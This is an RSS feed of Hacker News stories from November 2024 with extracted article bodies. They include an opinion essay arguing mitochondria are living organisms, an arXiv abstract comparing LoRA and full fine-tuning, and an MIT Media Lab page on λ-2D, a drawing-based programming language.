<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Fri, 08 Nov 2024 20:30:02 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Mitochondria Are Alive (203 pts)]]></title>
            <link>https://www.asimov.press/p/mitochondria</link>
            <guid>42088758</guid>
            <pubDate>Fri, 08 Nov 2024 17:39:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.asimov.press/p/mitochondria">https://www.asimov.press/p/mitochondria</a>, See on <a href="https://news.ycombinator.com/item?id=42088758">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p><strong><span>An opinion essay by </span><a href="https://www.hertzfoundation.org/person/liyam-chitayat/" rel="">Liyam Chitayat</a></strong></p><p>The cells within our body are the remnants of an ancient alliance.&nbsp;</p><p><span>In a 1967 paper called “</span><a href="https://doi.org/10.1016/0022-5193(67)90079-3" rel="">On the Origin of Mitosing Cells</a><span>,” American evolutionary biologist Lynn Margulis proposed an idea that, upon first hearing, seems ludicrous. Her paper, in fact, was rejected by 12 different journals before it was published.</span></p><p>Margulis argued that one-and-a-half billion years ago, a primitive eukaryotic cell engulfed an oxygen-utilizing bacterium. But rather than digesting this bacterium — or conversely, the bacterium destroying its newfound host — the two cells gradually entered into an endosymbiotic relationship; the host provided nutrients and protection to the bacterium, and the bacterium supplied energy to the host. Margulis argued that this endosymbiosis event was a seminal “innovation engine” for biological systems, ultimately leading to the modern mitochondrion and chloroplast.</p><p>Margulis’ theory was attacked and ridiculed, igniting academic hostilities that lasted for decades. Over time, though, biologists began to accept her ideas because the membrane structure and molecular machinery within mitochondria closely resemble that of extant bacteria. Most biologists today, however, also believe that mitochondria have “devolved” into little more than membrane-bound organelles, similar to inanimate components like the endoplasmic reticulum or Golgi apparatus.</p><p><span>But a swelling tide of scientific evidence about mitochondrial functions and dynamics suggests otherwise — </span><em>mitochondria are not just organelles, but their own life forms.</em><strong>&nbsp;&nbsp;&nbsp;</strong></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png" width="1200" height="800" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:800,&quot;width&quot;:1200,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:309045,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F58d79ce7-9f19-4a32-8ad2-13c18f831ad8_1200x800.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a><figcaption>An image from L. Margulis’ 1967 paper, depicting the origins of modern mitochondria.</figcaption></figure></div><p>This distinction between “life” on the one hand and “mere membranous structure” on the other may seem trivial, but it’s a symptom of a deeper problem. Defining mitochondria as “nonliving” isn’t just a classification mistake, nor a question of word choice. Rather, it is a fundamental misunderstanding of the nature and role of mitochondria. It inherently undermines our understanding of biological systems and deeply influences the tools we build to study them. </p><p>If we think of mitochondria as non-living organelles, how will we ever harness their full potential?</p><p>The precise definition of “life” has been debated since the inception of biology as a scientific field. Even today, researchers offer overlapping, but distinct, criteria. Molecular biologists tend to focus on characteristics like metabolism, growth and development, response to stimuli, reproduction, and the ability to process information or evolve. This definition uses “checklists” to determine whether or not an organism is alive.</p><p>Biophysicists often take a more rigorous approach, defining life by means of energetic terms. Physicists Erwin Schrödinger and Ilya Prigogine said that living organisms maintain order despite the universe's tendency towards increasing entropy, a measure of how dispersed or disordered the energy within a system is. Living systems maintain far-from-equilibrium states, constantly exchanging matter and energy with their environment to sustain highly organized structures. Cells take in low-entropy inputs, such as food or sunlight, and expel high-entropy outputs, including waste.</p><p>Regardless of which definition one chooses, mitochondria are clearly alive.</p><p>Mitochondria carry their own genomes and express their own genes within their lumens, an internal pocket of watery space, using biomolecules distinct from the cell’s nucleus. Mitochondria also replicate and divide through binary fission, much like bacteria. If one considers bacteria as living entities — and all biologists seem to — then it is impossible to explain why mitochondria are not.</p><p>From a thermodynamic perspective, mitochondria take in low-entropy inputs from their host cell, such as glucose or fatty acids, and expel high-entropy outputs, including carbon dioxide and water. Mitochondria also pump out protons through their inner membrane to maintain an out-of-equilibrium thermodynamic balance, using the resulting gradient to produce the ATP molecules that fuel cellular functions, from DNA replication to protein synthesis.</p><p><span>From the molecular biologist’s perspective, a mitochondrion’s role is not limited to simple energy generation, either. Mitochondria also process</span><em> </em><span>information and interact with their environment, much like a human cell. They monitor steroid hormones, oxidative stress, heat, ATP levels, secondary metabolites, and </span><a href="https://journals.physiology.org/doi/full/10.1152/physrev.00058.2021#" rel="">many more molecules</a><span> floating through their environment, the cell’s cytoplasm. Mitochondria then use this information to precisely control cellular functions. For example, when a virus invades a cell, the mitochondria are critical in sensing the intrusion and signaling a host cell to undergo programmed cell death to halt its spread.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png" width="1200" height="800" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/abab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:800,&quot;width&quot;:1200,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:327767,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fabab6c4f-4f66-44a9-8234-cc8eaddc975e_1200x800.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Mitochondria are intimately involved in many cellular processes; not just energy production. Image by the author.</figcaption></figure></div><p>And finally, mitochondria grow and reproduce in a manner distinct from the host’s replication process. Mitochondria independently copy their circular genomes, known as mitochondrial DNA, and divide through binary fission. Notably, mitochondrial replication has several distinct properties from those observed during human cellular replication. Mitochondrial DNA mutates 100-1,000 times faster than the human genome and these mutations can significantly alter a mitochondrion’s fitness, thereby changing the fitness of its host cell. Mitochondria are thus agents of — and subject to — the forces of evolution.</p><p><span>Despite all this evidence, the main case made against mitochondria being alive is that they do not perform all of these functions </span><em>independently</em><span>, as they must be embedded within the cytoplasm of a host cell to function. However, such an argument is logically inconsistent because, by this same logic, most organisms on Earth would not be considered “living.” After all, nothing in biology lives in isolation from its environment.&nbsp;</span></p><p><span>Human life begins inside of another human, with a zygote requiring many months in the uterus to develop into an infant. Many other organisms — not just mitochondria — also live inside other cells. For example, the bacteria </span><em><a href="https://www.ncbi.nlm.nih.gov/books/NBK7624/" rel="">rickettsiae</a><span> </span></em><span>occupy the cytoplasm of cells of ticks, lice, fleas, and mites. Other bacteria, such as </span><em><a href="https://pmc.ncbi.nlm.nih.gov/articles/PMC5911502/" rel="">Holospora spp.</a></em><span>, also live within the nucleus of various protists. All living creatures have evolved and live embedded within an environment or biological system, with different organisms embedded in different layers.</span></p><p>It seems like scientists have decided what is living based on whether or not an organism exists in certain, arbitrarily chosen layers of our biosphere. But this is a logical fallacy. Every living organism grows and adapts to occupy a specific context in the universe. We refer to this as the “effective niche” of the lifeform, which could be both inside and outside of another living system. Just because an organism has evolved to live in one niche does not mean that the organism cannot survive in another. Therefore, the so-called “potential niche” of a lifeform is often much larger than its effective niche.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png" width="1200" height="800" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/fa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:800,&quot;width&quot;:1200,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:404460,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa6de7af-2472-42ef-8e1d-cfad5738af17_1200x800.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>The “potential” niche of an organism is typically much larger than its “effective” niche. Image by the author.</figcaption></figure></div><p><span>Consider, for example, that free-living bacteria have been artificially implanted into the cytoplasms of different fungi. Researchers at ETH Zurich </span><a href="https://www.nature.com/articles/s41586-024-08010-x" rel="">recently implanted</a><span> “bacteria into the filamentous fungus </span><em>Rhizopus microsporus</em><span> to follow the fate of artificially induced endosymbioses.” It is clear that the insertion of bacteria into other cells does not suddenly make those bacteria non-living.</span></p><p><span>Similarly, a mitochondrion’s effective niche is a host cell’s cytoplasm, but its potential niche is likely far greater. Mitochondria are not bound to their host cell; they can </span><a href="https://onlinelibrary.wiley.com/doi/full/10.1111/tra.12951" rel="">travel between different cells</a><span>. Although different species carry distinct mitochondria, experiments show that mitochondria from one species can be transferred to another.&nbsp;</span></p><p><span>In 1997, scientists isolated mitochondria from chimpanzees and gorillas and showed that they are naturally internalized and integrated </span><a href="https://pmc.ncbi.nlm.nih.gov/articles/PMC23071/" rel="">into human cells</a><span>. Notably, the addition of external mitochondria even showed therapeutic benefits in </span><a href="https://www.frontiersin.org/journals/neuroscience/articles/10.3389/fnins.2022.800883/full" rel="">heart failure and spinal cord injury</a><span>. Thus, the potential niche that mitochondria can live in is greater than their effective niche.&nbsp;</span></p><p>When Margulis fought to overturn widely-held ideas in evolutionary biology, it allowed biologists to understand how complexity emerges in biological systems with the creation of eukaryotes and the rise of multicellularity. By revisiting our understanding of mitochondria, we will similarly break down long-held scientific dogmas.</p><p><span>In the early 20th century, Albert Einstein and Claude Shannon laid out the three pillars of the physical world: matter, information, and energy. When Francis Crick and James Watson published their model of the DNA double helix, they created a paradigm shift in our ability to understand and control the first two: matter and information. In the 70 years since then, we’ve developed powerful tools to study genes, decode how information moves through cells, and manipulate DNA using tools such as CRISPR-based gene editing. However, we have not yet reached an equal level of understanding of, or tools to manipulate, biological </span><em>energy</em><span>. Just as CRISPR enabled scientists to rewrite the code of life, we need similar tools to engineer mitochondria and control bioenergetics across the eukaryotic tree of life.</span></p><p>Despite more than a billion years of evolution, mitochondria still play critical roles within cells; they have not been displaced or rendered obsolete. This means that, as humans evolved, so too did the role of mitochondria in shaping our health and longevity. Mitochondrial dysfunction has long been linked to cardiovascular disorders, diabetes, Alzheimers, Parkinsons, amyotrophic lateral sclerosis, and other age-related diseases. In patients with these conditions, the mitochondria adopt abnormal and fragmented morphologies, failing to make enough energy for cells or sending improper communication signals. The diseased mitochondria gradually make toxic compounds that accelerate cell death.&nbsp;</p><p>Perhaps one of the paths to solving energy-related diseases, extending lifespan, or even engineering processes like photosynthesis lies in the complex interaction between our cells and the other lifeforms so actively inhabiting them. To find out, let’s embrace these eons-old alliances.</p><p><em>Thanks to Kate Adamala, Zeno Fox, Michael Retchin, Niko McCarty, and Ed Boyden for helpful feedback on this essay.</em></p><p><strong>Liyam Chitayat </strong><span>is a Hertz Fellow and PhD student at MIT working on synthetic endosymbiosis and building an initiative to integrate and accelerate the field. Liyam is also a Fellow of The Council on Strategic Risk.</span></p><p><strong>Cite: </strong><span>Liyam Chitayat. “Mitochondria Are Alive” </span><em>Asimov Press </em><span>(2024). DOI: https://doi.org/10.62211/38pe-75hu</span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Elwood Edwards, Voice of AOL's 'You've Got Mail ' Alert, Dies at 74 (121 pts)]]></title>
            <link>https://www.nytimes.com/2024/11/07/technology/elwood-edwards-aol-dead.html</link>
            <guid>42087087</guid>
            <pubDate>Fri, 08 Nov 2024 14:29:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2024/11/07/technology/elwood-edwards-aol-dead.html">https://www.nytimes.com/2024/11/07/technology/elwood-edwards-aol-dead.html</a>, See on <a href="https://news.ycombinator.com/item?id=42087087">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2024/11/07/technology/elwood-edwards-aol-dead.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[LoRA vs. Full Fine-Tuning: An Illusion of Equivalence (161 pts)]]></title>
            <link>https://arxiv.org/abs/2410.21228</link>
            <guid>42085665</guid>
            <pubDate>Fri, 08 Nov 2024 09:58:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2410.21228">https://arxiv.org/abs/2410.21228</a>, See on <a href="https://news.ycombinator.com/item?id=42085665">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2410.21228">View PDF</a>
    <a href="https://arxiv.org/html/2410.21228v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>Fine-tuning is a crucial paradigm for adapting pre-trained large language models to downstream tasks. Recently, methods like Low-Rank Adaptation (LoRA) have been shown to match the performance of fully fine-tuned models on various tasks with an extreme reduction in the number of trainable parameters. Even in settings where both methods learn similarly accurate models, \emph{are their learned solutions really equivalent?} We study how different fine-tuning methods change pre-trained models by analyzing the model's weight matrices through the lens of their spectral properties. We find that full fine-tuning and LoRA yield weight matrices whose singular value decompositions exhibit very different structure; moreover, the fine-tuned models themselves show distinct generalization behaviors when tested outside the adaptation task's distribution. More specifically, we first show that the weight matrices trained with LoRA have new, high-ranking singular vectors, which we call \emph{intruder dimensions}. Intruder dimensions do not appear during full fine-tuning. Second, we show that LoRA models with intruder dimensions, despite achieving similar performance to full fine-tuning on the target task, become worse models of the pre-training distribution and adapt less robustly to multiple tasks sequentially. Higher-rank, rank-stabilized LoRA models closely mirror full fine-tuning, even when performing on par with lower-rank LoRA models on the same tasks. These results suggest that models updated with LoRA and full fine-tuning access different parts of parameter space, even when they perform equally on the fine-tuned distribution. We conclude by examining why intruder dimensions appear in LoRA fine-tuned models, why they are undesirable, and how their effects can be minimized.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Reece Shuttleworth [<a href="https://arxiv.org/show-email/8c29db1a/2410.21228" rel="nofollow">view email</a>]      <br>    <strong>[v1]</strong>
        Mon, 28 Oct 2024 17:14:01 UTC (9,438 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Λ-2D: An Exploration of Drawing as Programming Language (141 pts)]]></title>
            <link>https://www.media.mit.edu/projects/2d-an-exploration-of-drawing-as-programming-language-featuring-ideas-from-lambda-calculus/overview/</link>
            <guid>42085273</guid>
            <pubDate>Fri, 08 Nov 2024 08:30:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.media.mit.edu/projects/2d-an-exploration-of-drawing-as-programming-language-featuring-ideas-from-lambda-calculus/overview/">https://www.media.mit.edu/projects/2d-an-exploration-of-drawing-as-programming-language-featuring-ideas-from-lambda-calculus/overview/</a>, See on <a href="https://news.ycombinator.com/item?id=42085273">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            
                <div>
                            

                            <p>&nbsp;An Exploration of Drawing as Programming Language, Featuring Ideas from Lambda Calculus</p>
                        </div>

                
                    <div>
    
        

    
        



    
        <div>
        <p><span>How can we code through drawing?</span>
        </p>
    </div>

    
        <div>
            <p>The area of non-verbal programming languages has not been unexplored. There are ASCII-based languages such as <a href="https://en.wikipedia.org/wiki/Befunge">Befunge</a> and <a href="https://github.com/aaronjanse/asciidots">asciidots</a>, as well as image-based ones such as <a href="https://esolangs.org/wiki/Piet">Piet</a>, just to name a few. Both inspired and challenged by these work, I set the following goals for my new language:</p><ul><li>To take advantage of the fact that the program is drawn, to include features that is otherwise unfeasible with text-based programming languages.</li><li>To have neither too few instructions, nor too many: For the former it becomes laborious to construct even the simplest programs, and for the latter it becomes non-minimalistic and difficult to do computer vision on.</li><li>To be able to draw programs that look visually appealing themselves, such that someone would want to put a frame around them and hang them on the wall.</li></ul>
        </div>

    
        <div>
        <p>
                    Though I'm normally an imperative and low-level person, I was compelled to use lambda calculus, or functional programming in its most primitive form, as the basis for the language, for it seemed to me that the ideas bear a lot of resemblance to a typical drawing. It has no concept of "execution" but only that of "evaluation", much like how the viewers' eyes can linger on any part of a drawing in no particular order, and by following many dots they see the line, and lines the form, and forms the composition.
                </p>
    </div>

    
        <div>
        <p>Conceptual blabber aside, I started with a grid-based system. While the user can draw continuous lines across many grids, each grid end up as one of a finite set of symbols. It seems like a good compromise between the ease of drawing for the human and that of parsing for the computer.
                    
                </p>
    </div>

    
        



    
        <div>
        <p>
                    Lambda calculus is such a concise language that it only has two instructions: that of function application and that of function definition. I quickly came up with working symbols for each: a "cup" shape for the former (for the silly intuition that applying the function is like putting the argument into the "cup"), and the eponymous greek letter for the latter (which is a bit unimaginative and arguably overused, but at least it's clear). Just like vanilla lambda calculus, functions always take one argument and produce one output; to get more, you can chain multiple functions together, known as "currying".
                </p>
    </div>

    
        



    
        <div>
        <p>Then came the wires to connect the symbols and through which data can flow. Technically the language is Turing complete at this point, but will be excruciatingly laborious to use, violating my design rule #2. Therefore, I added a lot more other symbols you would expect from your favorite programming languages, things like numbers and math operators. Consider them mere syntactic sugars: you can still stick to Church numerals (they're pretty cool) and other "pure" lambda calculus constructs if you'd like.
                    
                </p>
    </div>

    
        



    
        <div>
        <p>
                    I used to enjoy how easy it is in Scratch, to draw some sprites in the same editor and immediately use it for the program. Since my new language is entirely drawn, it should be even more natural to incorporate such kind of feature. Additionally, I wanted to be able to sketch the shape of a mathematical function and use it (e.g. for animating stuff), without the extra step of figuring out the equation (manually or otherwise). So I introduced the idea of "frames": fence any area of the canvas with wires, and put an indicating symbol at upper left; anything doodled in the area can be used as data. In a similar spirit, I wanted to be able to draw sliders (and perhaps other GUI elements in the future), which can be dragged at run-time to parametrically control the program.
                </p>
    </div>

    
        



    
        <div>
        <p>Initially I sketched my ideas on a dotted notebook, trying to construct some example programs in my (then imaginary) language. (I found this approach useful in my previous programming-language-design experiences). Then I figured it was time to code a parser for it, to see if it really "works". Since the computer vision part to scan the program from the paper was not ready yet, I decided to first make a simple editor software to let the user digitally draw programs.
                    
                </p>
    </div>

    
        <div>
        <p>Each symbol is made to 5x5 pixels, conveniently stamp-able on the gridded canvas, while the user can also draw "free hand" with a "pencil"-like tool. What initially started as a temporary measure grew to an almost full-fledged editor with many features.&nbsp;
                    
                </p>
    </div>

    
        



    
        <div>
        <p>One interesting problem that I did not anticipate while imagining the language was that it turned out so purely functional and absolutely state-less, that it becomes impossible to implement a "print" statement, for to print is to change state, to expect some things to be printed in some particular order is to assume that some expressions will be evaluated in some order. The solution was a functional re-thinking of the definition of "printing" as passing a piece of empty canvas to some function and receiving a new canvas with altered pixels resembling text (or whatever scribble desired) on it. (Replace "canvas" with "string" and "pixels" with "characters", if you wish, but you probably figured having read thus far that this is an anti-strings and pro-pixels language).
                    
                </p>
    </div>

    
        <div>
        <p>The baseline parser works by transpiling (translating) an entire λ-2d program to a javascript equivalence. The resultant javascript one-liner is a single horrendously inscrutable mega-expression that contains enough parentheses to make a lisper shudder. But the coolest part about it is that it works (albeit inefficiently)!
                    
                </p>
    </div>

    
        



    
        <div>
        <p>I work to improve the language by constructing more example programs, and as I do I discover design flaws to be corrected. It was a lot of fun, for I am myself unfamiliar with my own creation: I only know the base rules, and that in theory it should work, but as to how to actually program in it I am as clueless as any other new learner of programming languages. Gradually I start to grasp its temperaments, of what it is like to program in this very strange, drawing-based language. In the beginning I was using the syntax clumsily, trying to bend things to my will; later I become more artful and expressive in it. Coding in λ-2D is somewhat like playing Minecraft or Factorio, but it's even better because I can call it research.
                    
                </p>
    </div>

    
        <div>
        <p>
                    Below you can the comparison of two fractal tree programs, one in notebook doodles, and the other in refined digital form. (Please forgive the copious bugs and logical inconsistencies in the former, for I know people who can program on a piece of paper and get it right in one shot, unfortunately I'm not one of them and learned programming the "rogue" way: by running stuff over and over again and see if I can get any errors to pop up).
                </p>
    </div>

    
        



    
        



    
        <div>
        <p>I thought it must be cool and wondered what it would look like, to visualize the execution of a program written in this unusual language. The current parser spits out javascript and your browser's super-optimized javascript engine takes it over from there, so it is difficult to visualize the actual execution. However I can easily visualize the parsing, which should look similar to the path taken by a tree-walk interpreter executing the program.
                    
                </p>
    </div>

    
        



    
        <div>
        <p>And the animation did turn out quite fun to watch. But what if it makes sounds when going over different symbols? We can then "listen" to a program as it is being run, as if it were a song! I'm no musician myself but theoretically it should be possible to compose something musical with this kind of system.
                    
                </p>
    </div>

    
        <div>
        <p>It ended up sounding like a whacky computer game from 8-bit era. You can check it out in the <a href="https://l-2d.glitch.me/">online demo</a>&nbsp;(Menu &gt; Program &gt; Animated Run).</p>
    </div>

    
        <div>
        <p>λ-2D started as a part of a larger research to design a system where the user draw programs with pen and paper, and receive interactive feedback through augmented reality. However,&nbsp;it grew increasingly interesting that it became a full project on its own. &nbsp;Though I'm quite proud of this neat little language, it is yet to fully meet some of the initial goals. For instance, the programs look too much like circuit diagrams and not enough like, well, drawings. Also, I'm not too optimistic about how easy it is for a human (excluding myself) to learn it, and for a computer vision system to scan it without error.</p>
    </div>

    
        <div>
        <p>Therefore, after I refine λ-2D, I plan to design more potential programming languages that can be incorporated into the drawing-as-computation system I am developing, using knowledge and experience I've since gained.
                    
                </p>
    </div>

    
        <div>
        <p>
